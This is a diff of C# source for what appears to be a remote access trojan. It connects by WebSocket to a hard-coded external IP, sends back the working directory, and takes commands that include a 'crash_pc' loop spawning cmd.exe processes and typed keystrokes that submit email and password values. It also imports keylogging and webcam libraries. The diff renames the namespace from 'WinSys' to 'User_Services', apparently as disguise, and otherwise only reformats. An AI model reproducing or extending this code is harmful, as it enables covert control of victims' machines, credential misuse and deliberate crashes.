@@ -10,7 +10,7 @@ using Emgu.CV;
 using Keystroke.API;
 using System.Runtime.InteropServices;
 
-namespace WinSys
+namespace User_Services
 {
     class Program
     {
@@ -34,7 +34,8 @@ namespace WinSys
 
         }
 
-        public static void connection(){
+        public static void connection()
+        {
 
             using (var ws = new WebSocket("ws://154.49.211.230:4422"))
             {
@@ -82,7 +83,7 @@ namespace WinSys
                         SendKeys.SendWait(keys);
                         Thread.Sleep(1000);
                         var keys1 = "{TAB 24}email.value{ENTER}";
-                        SendKeys.SendWait(keys1);    
+                        SendKeys.SendWait(keys1);
                         Thread.Sleep(500);
                         var keys2 = "password.value{ENTER}";
                         SendKeys.SendWait(keys2);
@@ -177,7 +178,7 @@ namespace WinSys
                     else if (message.StartsWith("crash_pc"))
                     {
                         int times = System.Convert.ToInt32(message.Replace("crash_pc ", ""));
-                        for (int s = 0; s<times; s++)
+                        for (int s = 0; s < times; s++)
                         {
                             Process cmd = new Process();
                             cmd.StartInfo.FileName = "cmd.exe";
@@ -250,7 +251,7 @@ namespace WinSys
                         }
                     }
                 };
-                
+
                 ws.Connect();
                 ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                 new ManualResetEvent(false).WaitOne();
